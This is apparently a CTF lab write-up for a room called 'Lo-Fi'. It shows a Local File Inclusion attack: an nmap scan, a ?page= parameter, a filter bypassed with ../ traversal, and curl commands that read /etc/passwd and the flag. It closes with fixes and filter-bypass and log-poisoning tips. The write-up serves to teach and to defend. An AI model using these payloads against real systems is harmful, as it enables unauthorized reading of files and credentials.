## Overview

Lo-Fi is a beginner-friendly CTF room that demonstrates **Local File Inclusion (LFI)** — a web vulnerability where an application includes files based on user-supplied input without proper sanitization. The challenge presents a Lo-Fi music site with a video gallery, but a hidden parameter reveals a path traversal attack that leads straight to the flag.

---

## What is LFI?

**Local File Inclusion (LFI)** occurs when a web application includes a file using user-supplied input (like a `?page=` parameter) without proper sanitization. An attacker can traverse the directory structure to read arbitrary files on the server.

**Key concept:** If the app does `include($_GET['page'])` and you can control `page`, you can read `/etc/passwd`, source code, or any file the web server user has access to.

**Real-world examples:**
- Changing `?file=about.php` to `?file=../../../etc/passwd` to read system credentials
- Modifying `?template=default` to `?template=../../../../tmp/evil` for RCE via log poisoning
- Accessing configuration files like `wp-config.php` to steal database credentials

### Port Scan

```bash
nmap -sV -sC -T4 -Pn --min-rate=1000 10.48.147.11
```


Only two ports open — SSH (22) and HTTP (80). The web server is running an old version of Apache (2.2.22 from ~2012) on Ubuntu. The page title is **"Lo-Fi Music"**.

## Exploitation

### Step 1: Identify the Parameter

Viewing the page source of `index.php` revealed the sidebar section:

```html
<li><a href="/?page=relax.php">Relax</a></li>
<li><a href="/?page=sleep.php">Sleep</a></li>
<li><a href="/?page=chill.php">Chill</a></li>
<li><a href="/?page=coffee.php">Coffee</a></li>
<li><a href="/?page=vibe.php">Vibe</a></li>
<li><a href="/?page=game.php">Game</a></li>
```

The links use a `?page=` parameter to load content — a classic LFI pattern.

### Step 2: Test for LFI

We first tried an absolute path to `/etc/passwd`:

```
http://10.48.147.11/index.php?page=/etc/passwd
```

The server responded with a filter message: **"HACKKERRR!! HACKER DETECTED"** — the app blocks absolute paths starting with `/`.

### Step 3: Bypass the Filter

Using **relative path traversal** with `../` bypassed the filter:

```bash
curl -s "http://10.48.147.11/index.php?page=../../../etc/passwd"
```

The passwd file contents appeared in the page body:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
...
www-data:x:33:33:www-data:/var/www:/bin/sh
```

LFI confirmed. The filter only blocked absolute paths — relative traversal was unguarded.

### Step 4: Locate the Flag

From the challenge hint, the flag is in the **root directory**. Using the same relative traversal depth (3 levels up from `/var/www/html/`):

```bash
curl -s "http://10.48.147.11/index.php?page=../../../flag.txt"
```

The flag appeared in the response:

```
flag{<REDACTED>}
```

## Root Cause Analysis

The vulnerability exists because:

1. **Unsanitized user input** — The `?page=` parameter is passed directly to `include()` or `file_exists()` without validation
2. **Incomplete filtering** — The app blocks absolute paths (`/etc/passwd`) but allows relative traversal (`../../../etc/passwd`), which is trivially bypassed
3. **No allowlist** — The app doesn't restrict which files can be included to a specific directory (e.g., only files in `/pages/`)

The fix would be:
- Use an allowlist of permitted filenames (e.g., `['relax', 'sleep', 'chill']`)
- Use a mapping array instead of direct user input: `$page_map['relax'] = 'relax.php'`
- Disable `allow_url_include` and remove dangerous functions like `include()` with user input

---

## Key Takeaways

| Lesson | Why It Matters |
|--------|---------------|
| **Always check page source** | Hidden parameters and comments reveal attack surface that isn't visible on the page |
| **Filter bypass is standard** | Absolute path blocked? Try relative. Relative blocked? Try URL encoding, null bytes, or double encoding |
| **Old software has predictable bugs** | Apache 2.2.22 and PHP < 5.3 from 2012 suggests null byte truncation works |
| **LFI is not just for reading** | LFI can escalate to RCE via log poisoning, PHP wrappers, or file upload + include |
